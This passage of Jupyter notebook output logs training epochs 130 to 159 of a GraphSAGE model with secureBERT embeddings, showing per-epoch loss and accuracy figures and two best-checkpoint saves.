      "application/vnd.jupyter.widget-view+json": {
       "model_id": "991b7cf1545d4efbb543e38a64a0c9cf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:14:07 | INFO | Validation Loss: 0.0955 | Validation Accuracy: 0.9719\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "49221565048c4b0a87ecb5b63fbaa71c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:14:20 | INFO | Epoch 130 | Train Loss: 0.1129 | Train Accuracy: 0.9684\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e07503bd7d0247a08daff297693e039c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:14:21 | INFO | Validation Loss: 0.0996 | Validation Accuracy: 0.9716\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a12bea9ff64744799acc42a378da5048",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:14:34 | INFO | Epoch 131 | Train Loss: 0.1111 | Train Accuracy: 0.9690\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eb78c4c6e4db4d3e8234c4466572fb09",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:14:36 | INFO | Validation Loss: 0.0928 | Validation Accuracy: 0.9723\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "253892666c0f465f8cb4f80f195954a3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:14:49 | INFO | Epoch 132 | Train Loss: 0.1093 | Train Accuracy: 0.9695\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b5de623c08d74aa390782301a1ca4193",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:14:51 | INFO | Validation Loss: 0.0928 | Validation Accuracy: 0.9729\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5d27cd729da24e5dbfa01d3d9e2b899b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:04 | INFO | Epoch 133 | Train Loss: 0.1069 | Train Accuracy: 0.9702\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "943af474c2be4ebead57b397973244a3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:05 | INFO | Validation Loss: 0.0929 | Validation Accuracy: 0.9728\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3042ffacd9be439892c093d3b0accf5c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:18 | INFO | Epoch 134 | Train Loss: 0.1044 | Train Accuracy: 0.9707\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4c198f00c5cb40679cc9879c7fb12fb9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:20 | INFO | Validation Loss: 0.0836 | Validation Accuracy: 0.9741\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fa43ee21c0314d358b72ef4050749793",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:32 | INFO | Epoch 135 | Train Loss: 0.1055 | Train Accuracy: 0.9707\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c6eaf9a95a40440a829ab6617845445e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:33 | INFO | Validation Loss: 0.0862 | Validation Accuracy: 0.9753\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c043ff72bf0f4284bd9065bb89636cca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:45 | INFO | Epoch 136 | Train Loss: 0.1111 | Train Accuracy: 0.9687\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6785a3b0e6514c4b869bc3666283b4d9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:47 | INFO | Validation Loss: 0.0961 | Validation Accuracy: 0.9712\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5155887f59e64603afcd25e876d77c7e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:15:59 | INFO | Epoch 137 | Train Loss: 0.1128 | Train Accuracy: 0.9687\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e8bf6f825cf34f0993bbb667c9d6b3b0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:00 | INFO | Validation Loss: 0.0792 | Validation Accuracy: 0.9778\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c55d050144ef49118bc47f4b3a1861a3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:12 | INFO | Epoch 138 | Train Loss: 0.1056 | Train Accuracy: 0.9705\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dcfe3e268ba74a4d8ec1f360c0b6173b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:14 | INFO | Validation Loss: 0.0796 | Validation Accuracy: 0.9766\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "21923913997542748d4c82f73e6ee3c1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:28 | INFO | Epoch 139 | Train Loss: 0.1098 | Train Accuracy: 0.9694\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d61d4f155a3a4f248a81486fe04089c2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:30 | INFO | Validation Loss: 0.0905 | Validation Accuracy: 0.9732\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8588231df33b4c1e843f60b5261a066e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:42 | INFO | Epoch 140 | Train Loss: 0.1065 | Train Accuracy: 0.9701\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "09f0e84b57514dd3b1a491ea045d3d96",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:44 | INFO | Validation Loss: 0.0905 | Validation Accuracy: 0.9734\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a899040449c84de28cdd4e832a463f32",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:56 | INFO | Epoch 141 | Train Loss: 0.1051 | Train Accuracy: 0.9708\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5041ad60b9bb411e8e8473c833961198",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:16:57 | INFO | Validation Loss: 0.0815 | Validation Accuracy: 0.9754\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "21edd98640d24d3684a531ec0b7a055a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:17:09 | INFO | Epoch 142 | Train Loss: 0.1114 | Train Accuracy: 0.9687\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "efa0488887c2405283a9954e79eb77b4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:17:11 | INFO | Validation Loss: 0.0838 | Validation Accuracy: 0.9757\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "664dcfafc6c344eca338e68b4d48f561",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:17:23 | INFO | Epoch 143 | Train Loss: 0.1066 | Train Accuracy: 0.9703\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2815ca6d9e7348fbb9cdb4f4dce87fa0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:17:24 | INFO | Validation Loss: 0.0817 | Validation Accuracy: 0.9755\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "af5c2a92853a4d6b9d66c0117234aeb9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:17:36 | INFO | Epoch 144 | Train Loss: 0.1074 | Train Accuracy: 0.9699\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7b2f335e29934d71bee8b721ee78a347",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:17:38 | INFO | Validation Loss: 0.0793 | Validation Accuracy: 0.9776\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "83c789ab524d494abf842b95d7c4141f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:17:49 | INFO | Epoch 145 | Train Loss: 0.1068 | Train Accuracy: 0.9700\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bfd30fdf7e5445f0b87edfd33842b439",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:17:51 | INFO | Validation Loss: 0.0909 | Validation Accuracy: 0.9735\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7b368c6df3164e9eb256ad03615efa35",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:03 | INFO | Epoch 146 | Train Loss: 0.1066 | Train Accuracy: 0.9704\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "222082e296e442fb85ec59829958007e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:05 | INFO | Validation Loss: 0.0751 | Validation Accuracy: 0.9780\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_146_loss_0.0751_acc_0.9780\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e8f7f363747c4d5aa488dcf4b2ef251c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:17 | INFO | Epoch 147 | Train Loss: 0.1083 | Train Accuracy: 0.9697\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cc4818d02a3c47ce8e305b1b38dcd558",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:18 | INFO | Validation Loss: 0.0842 | Validation Accuracy: 0.9760\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ec2c4d95f65d4b5db6b53d35c226dec3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:31 | INFO | Epoch 148 | Train Loss: 0.1113 | Train Accuracy: 0.9687\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "53ec7b434bbf4c478d525d5ce263224a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:32 | INFO | Validation Loss: 0.0783 | Validation Accuracy: 0.9768\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "82745d90ae0a4b40aa75db1452ecaaa4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:44 | INFO | Epoch 149 | Train Loss: 0.1118 | Train Accuracy: 0.9688\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a081d870c0b645c4a6546cb10f732854",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:45 | INFO | Validation Loss: 0.0873 | Validation Accuracy: 0.9742\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "81d433f84d664271971ba561516a2ddd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:58 | INFO | Epoch 150 | Train Loss: 0.1081 | Train Accuracy: 0.9697\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "94de8cf502874dc6945044fde5860480",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:18:59 | INFO | Validation Loss: 0.0831 | Validation Accuracy: 0.9753\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5966cff319fe4675ad260c2087c2f498",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:19:11 | INFO | Epoch 151 | Train Loss: 0.1075 | Train Accuracy: 0.9696\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cdff30c3e1e94ba0b614fc8948576e06",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:19:13 | INFO | Validation Loss: 0.0987 | Validation Accuracy: 0.9701\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3d5dc530905f4e52964de98fc51f9b6b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:19:25 | INFO | Epoch 152 | Train Loss: 0.1075 | Train Accuracy: 0.9695\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "460a85f99ba545f9aa8a8c385de6d597",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:19:27 | INFO | Validation Loss: 0.0914 | Validation Accuracy: 0.9702\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5448b98dda4a4a149ac5b33b2024990e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:19:38 | INFO | Epoch 153 | Train Loss: 0.1039 | Train Accuracy: 0.9708\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "70c233b97cd149cdaec363d1e3382554",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:19:40 | INFO | Validation Loss: 0.0943 | Validation Accuracy: 0.9723\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cae97dfefc984fc5941625f5ad97ecad",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:19:51 | INFO | Epoch 154 | Train Loss: 0.1082 | Train Accuracy: 0.9693\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6e22eb4842254207a179824120ca09ae",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:19:53 | INFO | Validation Loss: 0.0829 | Validation Accuracy: 0.9754\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fec6f329f0184a70835a4d9b4edafd67",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:04 | INFO | Epoch 155 | Train Loss: 0.1018 | Train Accuracy: 0.9711\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c71b1fcfd4994b4bac7e55db4df52816",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:06 | INFO | Validation Loss: 0.0964 | Validation Accuracy: 0.9716\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9bc69aa2d7a14e3f9cc9324656ff550b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:17 | INFO | Epoch 156 | Train Loss: 0.1068 | Train Accuracy: 0.9695\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1f4bda040c9b494abe1fb05a789e9c02",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:19 | INFO | Validation Loss: 0.0703 | Validation Accuracy: 0.9798\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_156_loss_0.0703_acc_0.9798\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "84dc68e987654063a8f37173ef5238a2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:31 | INFO | Epoch 157 | Train Loss: 0.1043 | Train Accuracy: 0.9704\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7773d80767fe46639fb1cc139c94358d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:33 | INFO | Validation Loss: 0.0857 | Validation Accuracy: 0.9736\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b2ccbcd3fb744572bf222976eae3c36c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:46 | INFO | Epoch 158 | Train Loss: 0.1073 | Train Accuracy: 0.9699\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4a606f5842a7431b8e426a6ac5e8469c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:47 | INFO | Validation Loss: 0.0761 | Validation Accuracy: 0.9773\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d8c4c7295bb24fd78236d835d0ab0929",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:20:58 | INFO | Epoch 159 | Train Loss: 0.1032 | Train Accuracy: 0.9710\n"
     ]
    },
    {
     "data": {
